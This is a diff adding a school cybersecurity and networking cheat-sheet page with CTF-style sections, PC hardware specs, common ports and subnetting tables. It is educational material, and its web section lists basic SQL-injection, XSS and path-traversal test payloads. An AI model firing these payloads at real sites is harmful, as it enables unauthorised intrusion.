+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">' OR 1=1--</code>
+            <div class="card--command__description">Basic SQL injection test</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;img src=x onerror=alert(1)&gt;</code>
+            <div class="card--command__description">Basic XSS test payload</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">../</code>
+            <div class="card--command__description">Path traversal indicator</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">curl -I https://site</code>
+            <div class="card--command__description">Check headers and security flags</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="section">
+        <h2>🔐 Cryptography</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Ciphers, hashes, encodings, and crypto pitfalls explained simply.</p>
+        
+        <h3>ELI5: Crypto vs Encoding vs Hashing</h3>
+        <div class="info-box">
+          Encoding is like writing in a different font (easy to read back). Encryption is locking a message with a key. Hashing is turning it into a fingerprint you can’t reverse.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Decode Base64</code>
+            <div class="card--command__description">Identify and decode common encodings</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Crack weak hashes</code>
+            <div class="card--command__description">Use wordlists to crack MD5/SHA1</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Caesar/Vigenère ciphers</code>
+            <div class="card--command__description">Practice substitution cipher decoding</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">TLS inspection</code>
+            <div class="card--command__description">Check cert chain and cipher suites</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">echo SGVsbG8= | base64 -d</code>
+            <div class="card--command__description">Decode Base64</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">hashid hash.txt</code>
+            <div class="card--command__description">Identify hash types</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">openssl dgst -sha256 file</code>
+            <div class="card--command__description">Compute SHA-256 hash</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">openssl s_client -connect host:443</code>
+            <div class="card--command__description">Inspect TLS cert and ciphers</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="section">
+        <h2>🧩 Reverse Engineering</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Learn how programs work internally by analyzing binaries safely.</p>
+        
+        <h3>ELI5: What is Reverse Engineering?</h3>
+        <div class="info-box">
+          It’s like taking a toy apart to see how it works, then putting it back together. We do this to find bugs or understand behavior.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Strings and symbols</code>
+            <div class="card--command__description">Find clues inside binaries</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Basic disassembly</code>
+            <div class="card--command__description">Identify functions and control flow</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Simple crackme</code>
+            <div class="card--command__description">Reverse a password check in a safe binary</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Patch behavior</code>
+            <div class="card--command__description">Modify a jump to change output</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">strings program</code>
+            <div class="card--command__description">Extract readable strings</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">objdump -d program</code>
+            <div class="card--command__description">Disassemble binary</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">readelf -h program</code>
+            <div class="card--command__description">Inspect ELF headers</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">gdb program</code>
+            <div class="card--command__description">Debug and step through code</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="section">
+        <h2>🧪 Forensics</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Investigate files, timelines, memory dumps, and artifacts.</p>
+        
+        <h3>ELI5: What is Forensics?</h3>
+        <div class="info-box">
+          Forensics is like being a detective for computers. We look at clues (files, logs, timestamps) to figure out what happened.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">File timeline analysis</code>
+            <div class="card--command__description">Sort by created/modified timestamps</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Metadata hunt</code>
+            <div class="card--command__description">Use EXIF to find hidden info</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">File carving</code>
+            <div class="card--command__description">Recover deleted or hidden files</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Memory artifact search</code>
+            <div class="card--command__description">Identify processes and connections</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">exiftool file.jpg</code>
+            <div class="card--command__description">Extract metadata</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">binwalk -e image.bin</code>
+            <div class="card--command__description">Extract embedded files</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">foremost -i disk.img -o out/</code>
+            <div class="card--command__description">Carve files by headers</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">volatility -f mem.raw imageinfo</code>
+            <div class="card--command__description">Identify memory profile</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="section">
+        <h2>🧰 General Skills</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Core skills used across all cybersecurity domains.</p>
+        
+        <h3>ELI5: Why General Skills?</h3>
+        <div class="info-box">
+          These are the “tools in your backpack.” They help you move around systems, read files, and automate boring work.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Regex practice</code>
+            <div class="card--command__description">Find patterns in logs and files</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Scripting basics</code>
+            <div class="card--command__description">Automate tasks in Bash/Python</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Networking basics</code>
+            <div class="card--command__description">Trace routes and inspect ports</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Version control</code>
+            <div class="card--command__description">Track changes and collaborate</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">grep -R "error" logs/</code>
+            <div class="card--command__description">Search recursively in files</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">awk '{print $1}' file</code>
+            <div class="card--command__description">Extract columns</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">sed -n '1,20p' file</code>
+            <div class="card--command__description">Print lines 1–20</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ip a</code>
+            <div class="card--command__description">Show network interfaces</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="section">
+        <h2>🧨 Binary Exploitation</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Understand memory errors and how defenses stop exploitation.</p>
+        
+        <div class="warning-box">
+          <strong>⚠️ Lab-Only Activity</strong><br>
+          Binary exploitation should only be done in controlled lab environments or CTFs.
+        </div>
+        
+        <h3>ELI5: What is Binary Exploitation?</h3>
+        <div class="info-box">
+          Programs are like stacks of plates in memory. If you pile too many plates, they spill into places they shouldn’t be. We learn how that happens so we can prevent it.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Buffer overflow intro</code>
+            <div class="card--command__description">Crash a simple program in a lab</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Inspect protections</code>
+            <div class="card--command__description">Check NX, PIE, Canary settings</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Find offsets</code>
+            <div class="card--command__description">Use patterns to locate EIP/RIP overwrite</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ROP basics</code>
+            <div class="card--command__description">Chain gadgets to call functions</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">checksec --file=program</code>
+            <div class="card--command__description">View binary protections</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">gdb -q ./program</code>
+            <div class="card--command__description">Debug crash and registers</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pattern create 200</code>
+            <div class="card--command__description">Generate offset pattern</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pattern offset 0x6161616c</code>
+            <div class="card--command__description">Find overwrite offset</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- PC Components -->
+      <div class="cheat-sheet">
+        <h2>🖥️ PC Components Reference</h2>
+        
+        <h3>CPUs - Key Specifications</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Cores & Threads</code>
+            <div class="card--command__description">Physical cores (2-64) and logical threads (hyperthreading doubles count)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Base Clock</code>
+            <div class="card--command__description">Guaranteed minimum speed (e.g., 3.6 GHz)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Boost Clock</code>
+            <div class="card--command__description">Maximum turbo speed under load (e.g., 5.0 GHz)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">TDP (Thermal Design Power)</code>
+            <div class="card--command__description">65W-125W typical desktop, determines cooling needs</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Cache (L1/L2/L3)</code>
+            <div class="card--command__description">High-speed memory in MB (L3: 8-128 MB typical)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Socket Types</code>
+            <div class="card--command__description">LGA 1700 (Intel 12th/13th/14th gen), AM5 (AMD Ryzen 7000+)</div>
+          </div>
+        </div>
+        
+        <h3>RAM - Memory Types</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">DDR4-3200</code>
+            <div class="card--command__description">3200 MT/s transfer rate, 25.6 GB/s bandwidth</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">DDR5-4800</code>
+            <div class="card--command__description">4800 MT/s transfer rate, 38.4 GB/s bandwidth</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">DIMM (Desktop)</code>
+            <div class="card--command__description">288-pin for DDR4/DDR5, full-size desktop modules</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">SO-DIMM (Laptop)</code>
+            <div class="card--command__description">260-pin (DDR4) / 262-pin (DDR5), smaller form factor</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Dual Channel</code>
+            <div class="card--command__description">2× bandwidth using matched pairs in slots 2 & 4</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">CAS Latency (CL)</code>
+            <div class="card--command__description">CL16-CL40 range, lower = faster response time</div>
+          </div>
+        </div>
+        
+        <h3>Storage - Types & Speeds</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">HDD (7200 RPM)</code>
+            <div class="card--command__description">~150 MB/s, mechanical, cheap per GB, bulk storage</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">SATA SSD</code>
+            <div class="card--command__description">~550 MB/s read, 6 Gb/s interface, 2.5" form factor</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">NVMe Gen 3</code>
+            <div class="card--command__description">~3500 MB/s read, PCIe 3.0 x4 lanes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">NVMe Gen 4</code>
+            <div class="card--command__description">~7000 MB/s read, PCIe 4.0 x4 lanes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">M.2 2280</code>
+            <div class="card--command__description">22mm × 80mm, most common NVMe form factor</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">U.2</code>
+            <div class="card--command__description">Enterprise NVMe, 2.5" form factor, hot-swappable</div>
+          </div>
+        </div>
+        
+        <h3>Power Supplies (PSU)</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">80 PLUS Bronze</code>
+            <div class="card--command__description">82-85% efficiency, budget option</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">80 PLUS Gold</code>
+            <div class="card--command__description">87-90% efficiency, sweet spot for most builds</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">80 PLUS Platinum</code>
+            <div class="card--command__description">90-92% efficiency, premium/silent builds</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ATX 24-pin</code>
+            <div class="card--command__description">Main motherboard power connector (20+4 pin)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">EPS 8-pin (4+4)</code>
+            <div class="card--command__description">CPU power connector, high-end systems may need 2×</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">PCIe 8-pin (6+2)</code>
+            <div class="card--command__description">GPU power, high-end cards need 2-4 connectors</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">SATA Power</code>
+            <div class="card--command__description">Storage drives and accessories (15-pin)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Molex 4-pin</code>
+            <div class="card--command__description">Legacy peripherals, fans, RGB controllers</div>
+          </div>
+        </div>
+        
+        <h3>Display Types & Technologies</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">LCD (Liquid Crystal)</code>
+            <div class="card--command__description">Backlight + crystal layer, affordable, most common</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">LED (LED-backlit LCD)</code>
+            <div class="card--command__description">LCD with LED backlight, thinner, more efficient</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">IPS (In-Plane Switching)</code>
+            <div class="card--command__description">Best color accuracy, wide viewing angles, content creation</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">TN (Twisted Nematic)</code>
+            <div class="card--command__description">Fastest response (1ms), poor viewing angles, competitive gaming</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">VA (Vertical Alignment)</code>
+            <div class="card--command__description">Best contrast ratio, middle ground between IPS & TN</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">OLED (Organic LED)</code>
+            <div class="card--command__description">Per-pixel lighting, perfect blacks, infinite contrast</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">1080p (Full HD)</code>
+            <div class="card--command__description">1920×1080, standard for budget/e-sports gaming</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">1440p (2K)</code>
+            <div class="card--command__description">2560×1440, sweet spot for gaming (high-end 1080p alternative)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">4K (UHD)</code>
+            <div class="card--command__description">3840×2160, content creation, productivity</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Refresh Rate</code>
+            <div class="card--command__description">60Hz standard, 144Hz gaming, 240Hz competitive</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Networking Basics -->
+      <div class="cheat-sheet">
+        <h2>🌐 Networking Essentials</h2>
+        
+        <h3>Common TCP/UDP Ports</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">20/21 - FTP</code>
+            <div class="card--command__description">File Transfer Protocol (data/control channels)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">22 - SSH</code>
+            <div class="card--command__description">Secure Shell, encrypted remote access</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">23 - Telnet</code>
+            <div class="card--command__description">Unencrypted remote access (insecure, legacy)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">25 - SMTP</code>
+            <div class="card--command__description">Simple Mail Transfer Protocol (sending email)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">53 - DNS</code>
+            <div class="card--command__description">Domain Name System (name resolution)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">67/68 - DHCP</code>
+            <div class="card--command__description">Dynamic Host Configuration (auto IP assignment)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">80 - HTTP</code>
+            <div class="card--command__description">Hypertext Transfer Protocol (web traffic)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">110 - POP3</code>
+            <div class="card--command__description">Post Office Protocol v3 (email retrieval)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">143 - IMAP</code>
+            <div class="card--command__description">Internet Message Access Protocol (email sync)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">443 - HTTPS</code>
+            <div class="card--command__description">HTTP Secure (SSL/TLS encrypted web)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">445 - SMB</code>
+            <div class="card--command__description">Server Message Block (Windows file sharing)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">3389 - RDP</code>
+            <div class="card--command__description">Remote Desktop Protocol (Windows remote)</div>
+          </div>
+        </div>
+        
+        <h3>Private IP Address Ranges (RFC 1918)</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Class A: 10.0.0.0/8</code>
+            <div class="card--command__description">10.0.0.0 - 10.255.255.255 (16,777,216 addresses)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Class B: 172.16.0.0/12</code>
+            <div class="card--command__description">172.16.0.0 - 172.31.255.255 (1,048,576 addresses)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Class C: 192.168.0.0/16</code>
+            <div class="card--command__description">192.168.0.0 - 192.168.255.255 (65,536 addresses)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Loopback: 127.0.0.0/8</code>
+            <div class="card--command__description">127.0.0.1 = localhost, internal testing</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">APIPA: 169.254.0.0/16</code>
+            <div class="card--command__description">Automatic Private IP (DHCP failure fallback)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Link-Local: fe80::/10</code>
+            <div class="card--command__description">IPv6 local network communication</div>
+          </div>
+        </div>
+        
+        <h3>Cable Types & Speeds</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Cat 5e</code>
+            <div class="card--command__description">1 Gbps up to 100 meters, minimum standard</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Cat 6</code>
+            <div class="card--command__description">1 Gbps (100m), 10 Gbps (55m), better shielding</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Cat 6a</code>
+            <div class="card--command__description">10 Gbps up to 100m, fully shielded</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Cat 7</code>
+            <div class="card--command__description">10 Gbps (100m), heavy shielding, commercial</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Fiber Single-mode</code>
+            <div class="card--command__description">10-100+ Gbps, long distance (km range)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Fiber Multi-mode</code>
+            <div class="card--command__description">10-40 Gbps, shorter distance (550m max)</div>
+          </div>
+        </div>
+        
+        <h3>Wireless Standards (802.11)</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">802.11n (Wi-Fi 4)</code>
+            <div class="card--command__description">600 Mbps, 2.4/5 GHz, 2009 standard</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">802.11ac (Wi-Fi 5)</code>
+            <div class="card--command__description">1.3 Gbps (3.5 Gbps with wider channels), 5 GHz only</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">802.11ax (Wi-Fi 6)</code>
+            <div class="card--command__description">9.6 Gbps theoretical, 2.4/5 GHz, better density</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">802.11ax (Wi-Fi 6E)</code>
+            <div class="card--command__description">9.6 Gbps, adds 6 GHz band, less interference</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">802.11be (Wi-Fi 7)</code>
+            <div class="card--command__description">46 Gbps theoretical, 2.4/5/6 GHz (emerging 2024)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">2.4 GHz Band</code>
+            <div class="card--command__description">Longer range, better penetration, more interference</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">5 GHz Band</code>
+            <div class="card--command__description">Faster speeds, less interference, shorter range</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">6 GHz Band</code>
+            <div class="card--command__description">Wi-Fi 6E/7 only, cleanest spectrum, requires new hardware</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Subnetting -->
+      <div class="cheat-sheet">
+        <h2>🔢 Subnetting Quick Reference</h2>
+        
+        <h3>CIDR Notation Table</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">/30 = 255.255.255.252</code>
+            <div class="card--command__description">4 IPs, 2 usable (point-to-point links)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/29 = 255.255.255.248</code>
+            <div class="card--command__description">8 IPs, 6 usable (small networks)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/28 = 255.255.255.240</code>
+            <div class="card--command__description">16 IPs, 14 usable (very small office)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/27 = 255.255.255.224</code>
+            <div class="card--command__description">32 IPs, 30 usable (small department)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/26 = 255.255.255.192</code>
+            <div class="card--command__description">64 IPs, 62 usable (medium office)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/25 = 255.255.255.128</code>
+            <div class="card--command__description">128 IPs, 126 usable (large department)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/24 = 255.255.255.0</code>
+            <div class="card--command__description">256 IPs, 254 usable (standard home/office)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/23 = 255.255.254.0</code>
+            <div class="card--command__description">512 IPs, 510 usable (medium network)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/22 = 255.255.252.0</code>
+            <div class="card--command__description">1024 IPs, 1022 usable (large network)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/21 = 255.255.248.0</code>
+            <div class="card--command__description">2048 IPs, 2046 usable (large org)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/20 = 255.255.240.0</code>
+            <div class="card--command__description">4096 IPs, 4094 usable (very large)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/16 = 255.255.0.0</code>
+            <div class="card--command__description">65536 IPs, 65534 usable (Class B)</div>
+          </div>
+        </div>
+        
+        <h3>Subnetting Formulas</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Total IPs = 2^(32-prefix)</code>
+            <div class="card--command__description">For /24: 2^(32-24) = 2^8 = 256 addresses</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Usable Hosts = Total - 2</code>
+            <div class="card--command__description">Subtract network address and broadcast</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Number of Subnets = 2^n</code>
+            <div class="card--command__description">n = borrowed bits from host portion</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Subnet Increment</code>
+            <div class="card--command__description">256 - last octet of mask (e.g., 256-192=64)</div>
+          </div>
+        </div>
+        
+        <h3>Quick Calculations</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Network Address</code>
+            <div class="card--command__description">First IP in range (all host bits = 0)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Broadcast Address</code>
+            <div class="card--command__description">Last IP in range (all host bits = 1)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">First Usable Host</code>
+            <div class="card--command__description">Network address + 1</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Last Usable Host</code>
+            <div class="card--command__description">Broadcast address - 1</div>
+          </div>
+        </div>
+        
+        <h3>Example: 192.168.1.100/26</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Subnet Mask</code>
+            <div class="card--command__description">255.255.255.192 (binary: ...11000000)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Increment</code>
+            <div class="card--command__description">256 - 192 = 64 (subnets at 0, 64, 128, 192)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">This Subnet Range</code>
+            <div class="card--command__description">192.168.1.64 - 192.168.1.127 (100 falls in here)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Network Address</code>
+            <div class="card--command__description">192.168.1.64</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">First Usable</code>
+            <div class="card--command__description">192.168.1.65</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Last Usable</code>
+            <div class="card--command__description">192.168.1.126</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Broadcast</code>
+            <div class="card--command__description">192.168.1.127</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Total Hosts</code>
+            <div class="card--command__description">64 IPs, 62 usable hosts</div>
+          </div>
+        </div>
+      </div>
+      
+    </div>
+    
+    <!-- Professional Footer -->
+    <footer class="site-footer">
+      <div class="footer-container">
+        <div class="footer-section">
+          <h3>Quick Links</h3>
+          <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="tour.html">Tour Day Info</a></li>
+            <li><a href="about-class.html">About This Class</a></li>
+            <li><a href="resources.html">Study Hub</a></li>
+            <li><a href="cheat-sheets.html">Cheat Sheets</a></li>
+          </ul>
+        </div>
+        
+        <div class="footer-section">
+          <h3>A+ Study Guides</h3>
+          <ul>
+            <li><a href="a-plus-hardware.html">Hardware</a></li>
+            <li><a href="a-plus-motherboards.html">Motherboards & CPUs</a></li>
+            <li><a href="a-plus-networking.html">Networking</a></li>
+            <li><a href="a-plus-security.html">Security</a></li>
+          </ul>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Cybersecurity</h3>
+          <ul>
+            <li><a href="web-exploitation.html">Web Exploitation</a></li>
+            <li><a href="cryptography.html">Cryptography</a></li>
+            <li><a href="reverse-engineering.html">Reverse Engineering</a></li>
+            <li><a href="forensics.html">Digital Forensics</a></li>
+          </ul>
+        </div>
+        
+        <div class="footer-section">
+          <h3>About</h3>
+          <p>Network Engineering and Cybersecurity education resources created for students at Beattie Tech.</p>
+          <p style="margin-top: 15px;">Taught by Mr. Lingsch and Mr. Powers</p>
+        </div>
+      </div>
+      
+      <div class="footer-bottom">
+        <p>&copy; 2024 Beattie Tech | Network Engineering & Cybersecurity</p>
+      </div>
+    </footer>
+    
+    <!-- Mobile Menu Toggle Script -->
+    <script>
+      const mobileToggle = document.querySelector('.mobile-menu-toggle');
+      const navLinks = document.querySelector('.nav-links');
+      const dropdowns = document.querySelectorAll('.dropdown');
+      
+      mobileToggle.addEventListener('click', () => {
+        navLinks.classList.toggle('active');
+      });
+      
+      // Mobile dropdown toggle
+      dropdowns.forEach(dropdown => {
+        const toggle = dropdown.querySelector('.dropdown-toggle');
+        toggle.addEventListener('click', (e) => {
+          if (window.innerWidth <= 768) {
+            e.preventDefault();
+            dropdown.classList.toggle('active');
+          }
+        });
+      });
+      
+      // Close mobile menu when clicking outside
+      document.addEventListener('click', (e) => {
+        if (!e.target.closest('.site-header')) {
+          navLinks.classList.remove('active');
+          dropdowns.forEach(d => d.classList.remove('active'));
+        }
+      });
+    </script>
+    <script type="module" src="site.js"></script>
+  </body>
+</html>
